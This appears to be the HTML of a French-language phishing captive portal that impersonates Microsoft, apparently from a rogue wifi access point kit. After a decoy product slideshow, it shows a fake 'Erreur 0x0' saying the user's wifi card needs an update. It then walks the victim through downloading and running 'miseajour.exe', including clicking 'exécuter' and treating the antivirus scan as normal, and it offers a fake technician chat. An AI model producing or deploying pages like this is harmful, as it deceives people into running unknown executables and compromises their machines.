<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head>
  <title>Microsoft wifi</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <link rel="stylesheet" type="text/css" media="screen" href="/msftconnecttest/css/style.css" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {box-sizing: border-box;}
body {font-family: Verdana, sans-serif;}
.mySlides {display: none;}
img {vertical-align: middle;}

/* Slideshow container */
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
}

/* Caption text */
.text {
  color: #f2f2f2;
  font-size: 15px;
  padding: 8px 12px;
  position: absolute;
  bottom: 8px;
  width: 100%;
  text-align: center;
}

/* Number text (1/3 etc) */
.numbertext {
  color: #f2f2f2;
  font-size: 12px;
  padding: 8px 12px;
  position: absolute;
  top: 0;
}

/* The dots/bullets/indicators */
.dot {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbb;
  border-radius: 50%;
  display: inline-block;
  transition: background-color 0.6s ease;
}

.active {
  background-color: #717171;
}

/* Fading animation */
.fade {
  animation-name: fade;
  animation-duration: 1.5s;
}

@keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

/* On smaller screens, decrease text size */
@media only screen and (max-width: 300px) {
  .text {font-size: 11px}
}
</style>
  </head>
  <body>
<center><img src="/msftconnecttest/img/microsoft.png" alt="aide"></a><center>
	<br />
	<br />	
<h2>Des produits adaptés pour tous.</h2>
<p>Découvrez nos produits phares</p>

<div class="slideshow-container">

<div class="mySlides fade">
  <div class="numbertext">1 / 3</div>
  <img src="/img/office.jpeg" style="width:50%">
  <div class="text">Office 365</div>
</div>

<div class="mySlides fade">
  <div class="numbertext">2 / 3</div>
  <img src="/img/edge.png" style="width:50%">
  <div class="text">Microsof Edge</div>
</div>

<div class="mySlides fade">
  <div class="numbertext">3 / 3</div>
  <img src="/img/skype.png" style="width:50%">
  <div class="text">Skype</div>
</div>

</div>
<br>

<div style="text-align:center">
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span> 
</div>

<script>
let slideIndex = 0;
showSlides();

function showSlides() {
  let i;
  let slides = document.getElementsByClassName("mySlides");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 4000); // Change image every 2 seconds
}
</script>
	<br>
	<br>	
	<br>
<p><b>Erreur 0x0 :</b> votre carte wifi a besoin <b>d'une mise a jour</b> pour continuer à utiliser internet.</p>
			</p>
			<br />
			<br />
<p>Suivez les instructions suivantes:</p>

<p>T&eacute;l&eacute;chargez la mise à jour en cliquant sur le lien ci-dessous.</p>
<br />
<br />
<a href="miseajour.exe" download="">Mise à jour de la carte wifi</a>
<br />
<br />
<p>Une fois la mise à jour t&eacute;l&eacute;charg&eacute;e, cliquez dessus en haut a droite de votre navigateur ou lancez la depuis votre dossier téléchargements.</p>
<br />
<br />
<center><img src="/msftconnecttest/img/aide1.png"</a></center>
<br />
<br />
<p>Ensuite cliquez une seconde fois sur la mise à jour afin être sûr que la mise à jour se lance correctement. <p>
<br />
<br />
<center><img src="/msftconnecttest/img/windowsupdate.PNG" width="900" height="125" alt="aide"></a></center>
<br />
<br />
<p>Une fenêtre va s'ouvrir, cliquez sur <b>ex&eacute;cuter.</b><p>
<br />
<br />
<center><img src="/msftconnecttest/img/aide.PNG" width="600" height="550" alt="aide"></a></center>
<br />
<p>Votre antivirus va scanner le fichier afin de vérfier qu'il n'a pas été altéré durant le téléchargement. Ce processus est normal.
<br />
<p>Ensuite attendez que la mise à jour s'effectue, n'&eacute;teignez pas votre ordinateur et ne vous déconnectez pas du réseau wifi.Le processus dure entre cinq et dix minutes.</p>
<p>Vous serez avertis par un message une fois la mise à jour effectu&eacute;e et vous pourrez de nouveau naviguer sur internet.</p>
<br>
<br>
<p>Besoin d'une aide supplémentaire ? un technicien peut vous venir en aide: </strong> <a href="/msftconnecttest/shout/microsofttchat.php" target="_blank"><u>aide en ligne</u> ...</a>
</br>
</br>
<br />
<br />
	</body>
</html>
